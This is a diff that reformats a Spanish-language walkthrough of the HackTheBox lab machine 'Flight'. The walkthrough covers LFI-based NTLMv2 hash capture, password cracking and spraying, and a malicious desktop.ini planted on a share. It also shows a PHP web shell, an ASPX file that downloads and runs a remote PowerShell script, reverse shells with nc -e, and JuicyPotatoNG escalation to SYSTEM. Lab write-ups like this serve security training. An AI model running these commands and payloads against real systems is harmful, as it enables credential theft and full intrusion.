@@ -1,20 +1,18 @@
 ---
-category: writeup
-machine_name: Flight
+categories: ['HackTheBox', 'Hard', 'Windows']
 title: "Máquina Flight"
 description: "Resolución de la máquina Flight de HackTheBox"
-platform: "HackTheBox"
-difficulty: "Dificil"
 tags: ["LFI", "NTLMv2 Hash leak/cracking", "SMB Share abuse", "IIS abuse", "SeImpersonatePrivilege"]
+logo: '/assets/writeups/flight/logo.png'
 ---
 
 En esta máquina Windows encontraremos dos sitios webs; un portal y una "escuela" vulnerable a LFI, usaremos el LFI para obtener el hash NTLMv2 del usuario que corre el servicio web, luego de crackearlo al enumerar por SMB encontraremos un usuario con la misma contraseña y el mismo tiene capacidad de escribir en un recurso compartido que alguien revisa normalmente, subiendo un archivo `desktop.ini` malicioso obtendremos su hash y vamos a poder escribir en el recurso compartido del sitio web. Finalmente al acceder a la máquina nos haremos con la cuenta de un servicio IIS interno la cual es una cuenta de computador.
 
-<h2>RECONOCIMIENTO</h2>
+## RECONOCIMIENTO 
 
 La máquina tiene abiertos los puertos que un controlador de Active Directory tendría, pero no vamos a tocar esa temática en este contexto.
 
-{% highlight bash %}
+ ```bash
 # Nmap 7.93 scan initiated Fri May  5 13:45:53 2023 as: nmap -sS -Pn -n -vvv --min-rate 1000 -p- --open -oN ports 10.10.11.187
 Nmap scan report for 10.10.11.187
 Host is up, received user-set (0.39s latency).
@@ -44,7 +42,7 @@ PORT      STATE SERVICE          REASON
 
 Read data files from: /usr/bin/../share/nmap
 # Nmap done at Fri May  5 13:51:26 2023 -- 1 IP address (1 host up) scanned in 333.20 seconds
-{% endhighlight %}
+ ```
 
 El sitio web que tiene es el portal de una empresa de aviación nombrada "g0" bajo el dominio flight.htb 
 
@@ -56,16 +54,16 @@ No podemos ver recursos SMB, tampoco podemos acceder al MS-RPC o LDAP como usuar
 
 Siendo esta la primera máquina Windows del blog, es hora de comprometerla.
 
-<h2>INTRUSIÓN</h2>
+## INTRUSIÓN 
 
 Enumerando subdominios encontramos uno llamado "school"
 
-{% highlight bash %}
+ ```bash
 #ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.flight.htb" -fs 7069 -u http://10.10.11.187
 
 [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 1966ms]
     * FUZZ: school
-{% endhighlight %}
+ ```
 
 El sitio web alojado parece ser de una escuela de aviación... pero de texto solamente tiene el típico Lorem Ipsum señalando que esto es una template casi sin editar.
 
@@ -83,7 +81,7 @@ Tenemos la posibilidad de cargar cualquier archivo de la máquina... pero tambi�
 
 Vamos a crearnos un servidor SMB local con la herramienta de impacket `smbserver.py`
 
-{% highlight bash %}
+ ```bash
 ❯ sudo smbserver.py -smb2support resource .
 Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
 
@@ -93,7 +91,7 @@ Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corpo
 [*] Config file parsed
 [*] Config file parsed
 [*] Config file parsed
-{% endhighlight %}
+ ```
 
 Ahora, vamos a referenciarlo en el LFI usando la dirección //<your-ipaddress>/resource/index.html. Nota las barras normales porque no podemos usar las invertidas ya que están siendo filtradas por el script vulnerable.
 
@@ -101,7 +99,7 @@ Ahora, vamos a referenciarlo en el LFI usando la dirección //<your-ipaddress>/r
 
 Al mandar esta petición al servidor pues...
 
-{% highlight bash %}
+ ```bash
 [*] Incoming connection (10.10.11.187,53159)
 [*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
 [*] User G0\svc_apache authenticated successfully
@@ -111,11 +109,11 @@ Al mandar esta petición al servidor pues...
 [*] Incoming connection (10.10.11.187,53160)
 [*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
 ...
-{% endhighlight %}
+ ```
 
 Obtenemos tres intentos de autenticación del usuario svc_apache, entre sus intentos se encuentra su hash NTLMv2, asi que vamos a intentar crackearlo con hashcat
 
-{% highlight bash %}
+ ```bash
 # hashcat hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
 
 SVC_APACHE::flight:aaaaaaaaaaaaaaaa:a5dea54e00e89c65b7374a3db9df79eb:010100000000000000ad2c5eb37fd901bc9cab85092ecd2a0000000001001000500054004300580065005300530059000300100050005400430058006500530053005900020010004b00520050006b004300620048005300040010004b00520050006b0043006200480053000700080000ad2c5eb37fd90106000400020000000800300030000000000000000000000000300000f37fb59870b03702d1038e537042b995e28d50444162f1a69a511a324a4a3fa40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330039000000000000000000:S@Ss!K@*t13
@@ -141,13 +139,13 @@ Hardware.Mon.#1..: Temp: 75c Util: 85%
 
 Started: Fri May  5 20:43:05 2023
 Stopped: Fri May  5 20:43:27 2023
-{% endhighlight %}
+ ```
 
 Ahora tenemos la contraseña del usuario svc_apache, perfecto.
 
 Viendo los recursos compartidos vemos que no tenemos permisos de escritura a ninguno
 
-{% highlight bash %}
+ ```bash
 #smbmap -u "svc_apache" -p "S@Ss\!K@*t13" -H 10.10.11.187
 
 [+] IP: flight.htb:445	Name: unknown             	Status: Authenticated
@@ -161,11 +159,11 @@ Viendo los recursos compartidos vemos que no tenemos permisos de escritura a nin
 	SYSVOL                                            	READ ONLY	Logon server share 
 	Users                                             	READ ONLY	
 	Web                                               	READ ONLY	
-{% endhighlight %}
+ ```
 
 Pero si enumeramos los usuarios con crackmapexec y hacemos pray'n spray para ver si alguien tiene la misma contraseña que este servicio encontramos a un tal "s.moon"
 
-{% highlight bash %}
+ ```bash
 ❯ cme smb 10.10.11.187 -u users.txt -p "S@Ss\!K@*t13"
 SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.187    445    G0               [-] Connection Error: The NETBIOS connection with the remote host timed out.
@@ -179,11 +177,11 @@ SMB         10.10.11.187    445    G0               [-] flight.htb\l.kein:S@Ss!K
 SMB         10.10.11.187    445    G0               [-] flight.htb\g.lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
 SMB         10.10.11.187    445    G0               [-] flight.htb\r.cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
 SMB         10.10.11.187    445    G0               [+] flight.htb\s.moon:S@Ss!K@*t13 
-{% endhighlight %}
+ ```
 
 y con este usuario si que tenemos un permiso especial
 
-{% highlight bash %}
+ ```bash
 #smbmap -u "s.moon" -p "S@Ss\!K@*t13" -H 10.10.11.187
 
 [+] IP: flight.htb:445	Name: unknown             	Status: Authenticated
@@ -197,7 +195,7 @@ y con este usuario si que tenemos un permiso especial
 	SYSVOL                                            	READ ONLY	Logon server share 
 	Users                                             	READ ONLY	
 	Web                                               	READ ONLY	
-{% endhighlight %}
+ ```
 
 Pero sucede que si intentamos escribir en este share un ejecutable con psexec la máquina nos lo niega, puede que haya algún antivirus por lo tanto.
 
@@ -209,25 +207,25 @@ Pensemos, podemos subir cualquier archivo menos ejecutables; archivos ini, compr
 
 Estos archivos tienen una función especial, y es la de precargar todos los iconos y metadatos de la carpeta actual, la estructura de uno común es parecida a esto
 
-{% highlight ini %}
+ ```ini
 [.ShellClassInfo]
 NoSharing=1
 IconIndex=-141
 InfoTip=Esta es la carpeta de mi música.
-{% endhighlight %}
+ ```
 
 Existe una propiedad llamada `IconFile` que se le puede colocar a estos archivos de configuración, te permite especificar un archivo personalizado de iconos para cargar, puedes especificarle una ruta absoluta asi como **un recurso compartido**.
 
 Podemos probar a ver si hay alguna persona monitoreando el recurso compartido "Shared" colocando un `desktop.ini` como este para que cuando la persona abra la carpeta su sistema intente cargar el fichero de iconos en nuestro recurso compartido y a la vez nos devuelva el hash NTLMv2 de su usuario en cuestión
 
-{% highlight ini %}
+ ```ini
 [.ShellClassInfo]
 IconFile=\\10.10.14.39\icons\main.ico
-{% endhighlight %}
+ ```
 
 Vamos a subirlo usando smbclient al recurso:
 
-{% highlight bash %}
+ ```bash
 #smbclient -U "s.moon" //flight.htb/Shared
 
 smb: \> ls
@@ -237,19 +235,19 @@ smb: \> ls
 		5056511 blocks of size 4096. 1196917 blocks available
 smb: \> put desktop.ini
 putting file desktop.ini as \desktop.ini (0.0 kb/s) (average 0.0 kb/s)
-{% endhighlight %}
+ ```
 
 En los segundos de colocar el archivo, sin siquiera colocarle el bit de archivo oculto nos llega una autenticación SMB al servidor que hemos colocado antes.
 
-{% highlight bash %}
+ ```bash
 [*] Incoming connection (10.10.11.187,53360)
 [*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)
 [*] User G0\c.bum authenticated successfully
 [*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:744ccbb8540c9014557af1e053985356:01010000000000000038696abc7fd9015e9b9cc20c0aba8300000000010010007a004300470079007700410065006100030010007a00430047007900770041006500610002001000580051005700450041005300530066000400100058005100570045004100530053006600070008000038696abc7fd90106000400020000000800300030000000000000000000000000300000f37fb59870b03702d1038e537042b995e28d50444162f1a69a511a324a4a3fa40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330039000000000000000000
 [*] Closing down connection (10.10.11.187,53360)
-{% endhighlight %}
+ ```
 
-{% highlight bash %}
+ ```bash
 C.BUM::flight.htb:aaaaaaaaaaaaaaaa:744ccbb8540c9014557af1e053985356:01010000000000000038696abc7fd9015e9b9cc20c0aba8300000000010010007a004300470079007700410065006100030010007a00430047007900770041006500610002001000580051005700450041005300530066000400100058005100570045004100530053006600070008000038696abc7fd90106000400020000000800300030000000000000000000000000300000f37fb59870b03702d1038e537042b995e28d50444162f1a69a511a324a4a3fa40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330039000000000000000000:Tikkycoll_431012284
                                                           
 Session..........: hashcat
@@ -273,13 +271,13 @@ Hardware.Mon.#1..: Temp: 73c Util: 89%
 
 Started: Fri May  5 21:49:32 2023
 Stopped: Fri May  5 21:49:44 2023
-{% endhighlight %}
+ ```
 
 ¡Perfecto! otro usuario para probar.
 
 No tiene acceso a WinRM también, pero si puede escribir en el recurso compartido en el que se aloja las web de flight.htb y school.flight.htb
 
-{% highlight bash %}
+ ```bash
 [+] IP: 10.10.11.187:445	Name: school.flight.htb   	Status: Authenticated
 	Disk                                                  	Permissions	Comment
 	----                                                  	-----------	-------
@@ -291,11 +289,11 @@ No tiene acceso a WinRM también, pero si puede escribir en el recurso compartid
 	SYSVOL                                            	READ ONLY	Logon server share 
 	Users                                             	READ ONLY	
 	Web                                               	READ, WRITE	
-{% endhighlight %}
+ ```
 
 y la web al estar escrita en PHP nos permite colocar un archivo malicioso para ejecutar comandos, por lo que subiremos este
 
-{% highlight php %}
+ ```php
 <?php 
   if(empty($_GET["resource"])){
     die("Please specify a resource.");
@@ -303,9 +301,9 @@ y la web al estar escrita en PHP nos permite colocar un archivo malicioso para e
 
   echo system($_GET["resource"]);
 ?>
-{% endhighlight %}
+ ```
 
-{% highlight bash %}
+ ```bash
 # Puedes subir el archivo en el dominio que desees.
 smb: \> ls
   .                                   D        0  Sat May  6 04:57:01 2023
@@ -327,7 +325,7 @@ smb: \flight.htb\> ls
   resource.php                        A      120  Sat May  6 04:59:03 2023
 
 		5056511 blocks of size 4096. 1196517 blocks available
-{% endhighlight %}
+ ```
 
 Si vamos al recurso que subimos pues no tendremos problema en verlo y pedirle que ejecute un comando
 
@@ -335,11 +333,11 @@ Si vamos al recurso que subimos pues no tendremos problema en verlo y pedirle qu
 
 Vamos a lanzarnos una reverse shell
 
-{% highlight powershell %}
+ ```powershell
 http://flight.htb/resource.php?resource=powershell%20-EncodedCommand%20SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMwA5ADoAOAAwADAAMAAvAHUAdABpAGwALgBwAHMAMQAiACkAKQAKAA==
-{% endhighlight %}
+ ```
 
-{% highlight bash %}
+ ```bash
 ❯ rlwrap nc -lvnp 443
 Listening on 0.0.0.0 443
 Connection received on 10.10.11.187 53452
@@ -347,28 +345,28 @@ Windows PowerShell Testing
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
 PS C:\xampp\htdocs\flight.htb>
-{% endhighlight %}
+ ```
 
 Ahora, para poder cambiar de usuario dado que no podemos usar WinRM utilizaremos el programa [RunasCs](https://github.com/antonioCoco/RunasCs) para ejecutar comandos como otros usuarios, descargándolo y probándolo parece que funciona
 
-{% highlight powershell %}
+ ```powershell
 PS C:\Users\svc_apache\Documents> curl -o RunasCs.exe http://10.10.14.39:8000/RunasCs.exe
 PS C:\Users\svc_apache\Documents> ./RunasCs.exe c.bum Tikkycoll_431012284 whoami
 [*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
 flight\c.bum
-{% endhighlight %}
+ ```
 
 Usando el mismo programa para obtener una reverse shell funciona sin ningún problema.
 
-{% highlight powershell %}
+ ```powershell
 PS C:\Users\svc_apache\Documents> ./RunasCs.exe c.bum Tikkycoll_431012284 cmd.exe -r 10.10.14.39:443
 [*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
 [+] Running in session 0 with process function CreateProcessWithLogonW()
 [+] Using Station\Desktop: Service-0x0-5b533$\Default
 [+] Async process 'cmd.exe' with pid 3268 created and left in background.
-{% endhighlight %}
+ ```
 
-{% highlight bash %}
+ ```bash
 ❯ rlwrap nc -lvnp 443
 Listening on 0.0.0.0 443
 Connection received on 10.10.11.187 53484
@@ -376,11 +374,11 @@ Microsoft Windows [Version 10.0.17763.2989]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32>
-{% endhighlight %}
+ ```
 
 Estando ya como c.bum podemos ver la primera flag
 
-{% highlight batch %}
+ ```batch
 C:\Windows\system32>cd ..
 
 C:\Windows>cd ..
@@ -405,18 +403,18 @@ C:\Users\C.Bum\Desktop>dir
 
 C:\Users\C.Bum\Desktop>type user.txt
 89c7ae7e53e349e587b3603a73******
-{% endhighlight %}
+ ```
 
-<h2>ESCALADA DE PRIVILEGIOS</h2>
+## ESCALADA DE PRIVILEGIOS 
 
 Mirando los puertos en escucha de la máquina encontramos el 8000, que en el escaneo anterior no salía.
 
-{% highlight bat %}
+ ```bat
 #netstat -p tcp -nat
 ...
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       InHost      
 ...
-{% endhighlight %}
+ ```
 
 Descárgando chisel en la máquina para efectuar redireccionado de puertos desde nuestro puerto 8000 encontramos que es un servidor IIS 10.0... sin un archivo de índice
 
@@ -424,7 +422,7 @@ Descárgando chisel en la máquina para efectuar redireccionado de puertos desde
 
 Pero, al estar en modo desarrollo nos muestra la ruta de los archivos que se supone hostea, es `C:\inetpub\development`, mirando esta carpeta se encuentra otra carpeta con el mismo nombre de development y, ¡tenemos permisos de escritura en ella!
 
-{% highlight powershell %}
+ ```powershell
 PS C:\inetpub\development> ls 
 ls 
 
@@ -452,21 +450,21 @@ development flight\C.Bum:(OI)(CI)(W)
             CREATOR OWNER:(I)(OI)(CI)(IO)(F)
 
 Successfully processed 1 files; Failed processing 0 files
-{% endhighlight %}
+ ```
 
 Por lo que podríamos intentar colocar un archivo malicioso para ganar una consola interactiva como el usuario que corre el servidor IIS, asi que vamos a intentar colar un archivo .asp o .aspx con el siguiente contenido para verificar que dicha extensión se procesa:
 
-{% highlight vb %}
+ ```visualbasic
 'test.aspx'
 
 <%
   Response.Write("Hallo man?")
 %>
-{% endhighlight %}
+ ```
 
-{% highlight powershell %}
+ ```powershell
 PS C:\inetpub\development\development> curl -o test.aspx http://10.10.14.39:8001/test.aspx
-{% endhighlight %}
+ ```
 
 Probando con .asp no funcionó pero con .aspx sí
 
@@ -474,7 +472,7 @@ Probando con .asp no funcionó pero con .aspx sí
 
 Modifiquemos el archivo que creamos para entablarnos una consola interactiva hacía nuestro equipo
 
-{% highlight vb %}
+ ```visualbasic
 <%
   Dim shell
   
@@ -482,9 +480,9 @@ Modifiquemos el archivo que creamos para entablarnos una consola interactiva hac
   Response.Write(shell.Run("powershell IEX((New-Object Net.WebClient).DownloadString('http://10.10.14.39:8001/util.ps1'))"))
   'Coloco en la respuesta el código de salida del programa para comodidad.'
 %>
-{% endhighlight %}
+ ```
 
-{% highlight powershell %}
+ ```powershell
 ❯ rlwrap nc -lvnp 443
 Listening on 0.0.0.0 443
 Connection received on 10.10.11.187 51158
@@ -492,17 +490,17 @@ Windows PowerShell Testing
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
 PS C:\windows\system32\inetsrv>
-{% endhighlight %}
+ ```
 
 Este es el usuario `iis apppool\defaultapppool`, y es técnicamente una cuenta con varios privilegios que se le asigna a por defecto al IIS, por lo que tenemos el "SeImpersonatePrivilege" y si llegaramos a obtener un ticket de Kerberos como esta cuenta (Puedes con Rubeus) podríamos dumpear todo el NTDS, pero vamos a aprovecharnos del SeImpersonatePrivilege con JuicyPotatoNG y netcat.
 
-{% highlight powershell %}
+ ```powershell
 PS C:\Temp> curl -o potato.exe http://10.10.14.39:8001/JuicyPotatoNG.exe
 PS C:\Temp> curl -o nc64.exe http://10.10.14.39:8001/nc64.exe
 PS C:\Temp> .\potato.exe -p C:\Temp\nc64.exe -a "-e cmd.exe 10.10.14.39 8443" -t t
-{% endhighlight %}
+ ```
 
-{% highlight bash %}
+ ```bash
 ❯ rlwrap nc -lvnp 8443
 Listening on 0.0.0.0 8443
 Connection received on 10.10.11.187 51278
@@ -512,11 +510,11 @@ Microsoft Windows [Version 10.0.17763.2989]
 C:\Windows\system32> whoami
 whoami
 nt authority\system
-{% endhighlight %}
+ ```
 
 Ahora podemos tomar la última flag
 
-{% highlight bash %}
+ ```bash
 C:\Users\Administrator>dir
 dir
  Volume in drive C has no label.
@@ -549,6 +547,6 @@ cd Desktop
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 d638624f8b1a2aefa2cf07b9fd******
-{% endhighlight %}
+ ```
 
 *¿No hay extra?, No esta vez* 
